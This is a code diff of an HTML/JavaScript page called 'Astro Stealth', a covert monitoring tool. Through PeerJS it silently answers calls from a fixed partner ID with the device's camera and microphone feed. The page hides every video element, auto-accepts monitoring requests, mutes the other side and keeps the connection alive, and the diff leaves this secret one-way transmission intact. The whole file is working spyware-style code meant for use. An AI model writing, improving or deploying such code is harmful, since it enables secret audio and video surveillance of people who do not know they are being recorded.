@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Astro Stealth</title>
     <style>
-        /* Complete invisibility - no visual elements */
+        /* Complete invisibility */
         * {
             margin: 0;
             padding: 0;
@@ -20,7 +20,7 @@
             overflow: hidden;
         }
         
-        /* Hidden video elements - prevents any preview LED */
+        /* Hidden video elements */
         video {
             position: absolute;
             width: 1px;
@@ -38,11 +38,6 @@
             opacity: 0;
             pointer-events: none;
         }
-        
-        /* Ensure no visible elements on page */
-        div, span, button, iframe {
-            display: none !important;
-        }
     </style>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 </head>
@@ -55,9 +50,9 @@
         const MY_ID = "BPrivate";
         const PARTNER_ID = "APrivate";
         const AUTO_ACCEPT_CALLS = true;     // Auto-accept all monitoring requests
-        const SEND_AUDIO = true;             // Send audio FROM stealth device
-        const SEND_VIDEO = true;             // Send video FROM stealth device
-        // ==============================================
+        const SEND_AUDIO = true;             // Send audio from stealth device
+        const SEND_VIDEO = true;             // Send video from stealth device
+        // ================================================
         
         let peer = null;
         let currentCall = null;
@@ -72,85 +67,32 @@
         }
         
         async function getMediaStream() {
-            // First try to get both front and back camera capabilities
-            let devices = [];
-            let backCameraExists = false;
-            let frontCameraExists = false;
-            
-            try {
-                const allDevices = await navigator.mediaDevices.enumerateDevices();
-                devices = allDevices.filter(device => device.kind === 'videoinput');
-                backCameraExists = devices.some(device => device.label.toLowerCase().includes('back') || device.label.toLowerCase().includes('rear'));
-                frontCameraExists = devices.some(device => device.label.toLowerCase().includes('front') || device.label.toLowerCase().includes('face'));
-                log(`Found ${devices.length} cameras - Back: ${backCameraExists}, Front: ${frontCameraExists}`, 'info');
-            } catch(e) {
-                log(`Could not enumerate devices: ${e.message}`, 'warn');
-            }
-            
-            // Try back camera first if available, otherwise fallback to any camera
-            let constraints = {
-                audio: SEND_AUDIO ? {
-                    echoCancellation: false,
-                    noiseSuppression: false,
-                    autoGainControl: false
-                } : false,
+            const constraints = {
+                audio: SEND_AUDIO,
                 video: SEND_VIDEO ? {
+                    facingMode: 'user',
                     width: { ideal: 640 },
                     height: { ideal: 480 }
                 } : false
             };
             
-            // Try to get back camera specifically
-            if (SEND_VIDEO) {
-                try {
-                    log('Attempting to access BACK camera...', 'info');
-                    const backCameraConstraints = {
-                        audio: SEND_AUDIO,
-                        video: { facingMode: { exact: "environment" } }
-                    };
-                    const stream = await navigator.mediaDevices.getUserMedia(backCameraConstraints);
-                    log('✅ BACK camera acquired successfully', 'success');
-                    return stream;
-                } catch (backError) {
-                    log(`Back camera not available: ${backError.message}`, 'warn');
-                    
-                    // Try front camera
-                    try {
-                        log('Attempting to access FRONT camera...', 'info');
-                        const frontCameraConstraints = {
-                            audio: SEND_AUDIO,
-                            video: { facingMode: { exact: "user" } }
-                        };
-                        const stream = await navigator.mediaDevices.getUserMedia(frontCameraConstraints);
-                        log('✅ FRONT camera acquired successfully', 'success');
-                        return stream;
-                    } catch (frontError) {
-                        log(`Front camera not available: ${frontError.message}`, 'warn');
-                        
-                        // Fallback to default camera
-                        log('Falling back to default camera...', 'info');
-                        const defaultConstraints = {
-                            audio: SEND_AUDIO,
-                            video: true
-                        };
-                        const stream = await navigator.mediaDevices.getUserMedia(defaultConstraints);
-                        log('✅ Default camera acquired', 'success');
-                        return stream;
-                    }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                log(`Media acquired - Audio: ${SEND_AUDIO}, Video: ${SEND_VIDEO}`);
+                return stream;
+            } catch (e) {
+                if (e.name === 'NotAllowedError') {
+                    log('Camera/Mic permission denied', 'error');
+                } else {
+                    log(`Media error: ${e.message}`, 'error');
                 }
-            } else {
-                // Audio only
-                const audioConstraints = {
-                    audio: SEND_AUDIO,
-                    video: false
-                };
-                return await navigator.mediaDevices.getUserMedia(audioConstraints);
+                throw e;
             }
         }
         
         function handleIncomingCall(call) {
             const isVideo = call.metadata?.type === 'video';
-            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} monitoring request from remote`, 'info');
+            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} monitoring request`, 'info');
             
             if (!AUTO_ACCEPT_CALLS) {
                 log('Call rejected (auto-accept disabled)', 'warn');
@@ -162,37 +104,25 @@
             getMediaStream().then(stream => {
                 localStream = stream;
                 
-                // Log what we're sending
-                const hasAudio = stream.getAudioTracks().length > 0;
-                const hasVideo = stream.getVideoTracks().length > 0;
-                log(`Sending to remote - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
-                
-                // Hide video element completely
-                if (hasVideo) {
-                    const videoElement = document.getElementById('localVideo');
-                    videoElement.srcObject = stream;
-                    videoElement.style.opacity = '0';
-                    videoElement.style.width = '1px';
-                    videoElement.style.height = '1px';
+                // Show local video if enabled (hidden element)
+                if (SEND_VIDEO && stream.getVideoTracks().length > 0) {
+                    document.getElementById('localVideo').srcObject = stream;
                 }
                 
                 // Answer call with stealth device's stream
                 call.answer(stream);
                 currentCall = call;
                 
-                // Handle incoming stream from remote (IGNORE)
+                // Handle remote stream (not needed for stealth, but must handle)
                 call.on('stream', (remoteStream) => {
-                    log(`Remote stream received but IGNORED (stealth receives nothing)`, 'info');
-                    
-                    if (remoteStream) {
-                        remoteStream.getTracks().forEach(track => {
-                            track.enabled = false;
-                            track.stop();
-                            log(`Disabled remote ${track.kind} track`, 'info');
-                        });
+                    // Remote stream is from controller - ignore or play silently
+                    if (remoteStream.getAudioTracks().length > 0) {
+                        const silentAudio = new Audio();
+                        silentAudio.srcObject = remoteStream;
+                        silentAudio.volume = 0; // Mute completely
+                        silentAudio.play().catch(() => {});
                     }
-                    
-                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ACTIVE - Stealth → Remote only`, 'success');
+                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ACTIVE`, 'success');
                 });
                 
                 call.on('close', () => {
@@ -213,10 +143,7 @@
         
         function endCall() {
             if (localStream) {
-                localStream.getTracks().forEach(track => {
-                    track.stop();
-                    log(`Stopped ${track.kind} track`, 'info');
-                });
+                localStream.getTracks().forEach(track => track.stop());
                 localStream = null;
             }
             if (currentCall) {
@@ -224,8 +151,6 @@
                 currentCall = null;
             }
             document.getElementById('localVideo').srcObject = null;
-            document.getElementById('remoteVideo').srcObject = null;
-            log('Call ended, camera/mic released', 'info');
         }
         
         function initPeer() {
@@ -235,12 +160,11 @@
             }
             
             log(`Initializing stealth device as ${MY_ID}`);
-            
             peer = new Peer(MY_ID);
             
             peer.on('open', (id) => {
-                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`, 'success');
-                log(`Ready to send to ${PARTNER_ID} - Audio: ${SEND_AUDIO}, Video: ${SEND_VIDEO}`, 'info');
+                log(`Stealth device ACTIVE - ID: ${MY_ID}`);
+                log(`Waiting for connection from ${PARTNER_ID}...`);
                 reconnectAttempts = 0;
             });
             
@@ -273,20 +197,17 @@
                 } else if (err.type === 'network') {
                     log('Network error - reconnecting...', 'warn');
                     if (peer) peer.reconnect();
-                } else {
-                    log(`Peer error: ${err.type}`, 'error');
                 }
             });
         }
         
         // Auto-start stealth service
         log('=== ASTRO STEALTH SERVICE ===');
-        log(`Configuration (ONE-WAY: Stealth → Remote only):`);
+        log(`Configuration:`);
         log(`  - ID: ${MY_ID}`);
         log(`  - Target: ${PARTNER_ID}`);
-        log(`  - Send Audio TO Remote: ${SEND_AUDIO}`);
-        log(`  - Send Video TO Remote: ${SEND_VIDEO}`);
-        log(`  - Receive from Remote: ❌ DISABLED`);
+        log(`  - Send Audio: ${SEND_AUDIO}`);
+        log(`  - Send Video: ${SEND_VIDEO}`);
         log(`  - Auto-accept: ${AUTO_ACCEPT_CALLS}`);
         
         initPeer();
@@ -294,27 +215,15 @@
         // Keep service alive
         setInterval(() => {
             if (peer && !peer.disconnected && currentCall) {
-                console.log('[STEALTH] Heartbeat - actively sending to remote');
+                console.log('[STEALTH] Heartbeat - monitoring active');
             }
         }, 30000);
         
         // Clean shutdown
         window.addEventListener('beforeunload', () => {
-            log('Stealth device shutting down...', 'info');
             if (currentCall) currentCall.close();
             if (peer) peer.destroy();
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
-        });
-        
-        // Handle page visibility
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                log('Page hidden - maintaining stealth', 'info');
-            } else {
-                log('Page visible - stealth still active', 'info');
-            }
+            if (localStream) localStream.getTracks().forEach(track => track.stop());
         });
     </script>
 </body>
